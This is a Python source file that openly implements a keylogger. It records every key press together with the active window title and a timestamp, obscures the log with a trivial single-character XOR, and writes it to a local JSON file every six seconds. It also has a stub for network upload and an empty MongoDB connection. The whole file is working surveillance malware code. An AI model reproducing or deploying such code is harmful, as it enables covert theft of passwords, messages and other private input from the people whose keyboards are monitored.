import time
from datetime import datetime
import json
import keyboard
import pygetwindow as gw
from abc import ABC, abstractmethod
import threading
from pymongo import MongoClient

class KeyLoggerService:

    def __init__(self):
        self.data = {}
        self._get_keyword()

    def get_data(self):
        data = self.data.copy()
        self.data.clear()
        return data

    def _get_keyword(self) -> None:
        def callback(key):

            active_window = self._get_window()
            if active_window not in self.data:
                self.data[active_window] = {}

            current_time = self._get_time()
            if current_time not in self.data[active_window]:
                self.data[active_window][current_time] = ""

            self.data[active_window][current_time] += key.name

        keyboard.on_press(callback)

    def _get_window(self):
        try:
            return gw.getActiveWindow().title
        except:
            print("There  was an error to get the window!")

    def _get_time(self):
        return datetime.now().strftime("%Y-%Y-%m-%d %H:%M")

class Writer(ABC):

    @abstractmethod
    def write(self, data):
        pass

class FileWriter(Writer):

    def write(self, data: dict) -> None:
        try:
            with open("log.json", "r") as file:
                try:
                    origin_data = json.load(file)
                except json.JSONDecodeError:
                    origin_data = {}  # If file is empty or invalid, start fresh
        except FileNotFoundError:
            origin_data = {}

        origin_data.update(data)

        with open("log.json", "w") as file:
            json.dump(origin_data, file, indent=4)


class NetworkWriter(Writer):

    def write(self, data):
        pass

class Encryptor:
    def __init__(self, key="a"):
        self.key = key

    def _encrypt(self, string):
        return "".join([chr(ord(letter) ^ ord(self.key)) for letter in string])

    def xor(self, data):
        encrypted_data = {}
        for key in data:
            new_key = self._encrypt(key)
            encrypted_data[new_key] = {self._encrypt(t): self._encrypt(data[key][t]) for t in data[key]}
        return encrypted_data

    def decrypt_data(self, data):
        return self.xor(data)

class KeyLoggerManager:

    def __init__(self):
        self.key_logger_service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor = Encryptor()
        self.key_logger_thread = threading.Thread(target=self.main)
        self.key_logger_thread.start()

    def main(self):
        while True:
            time.sleep(6)
            data = self.key_logger_service.get_data()
            encrypted_data = self.encryptor.xor(data)
            self.file_writer.write(encrypted_data)

def get_database():
    CONNECTION_STRING = ""
    client = MongoClient(CONNECTION_STRING)
    return client

keylogger = KeyLoggerManager()
keyboard.wait()

print("keylogger is starting!")
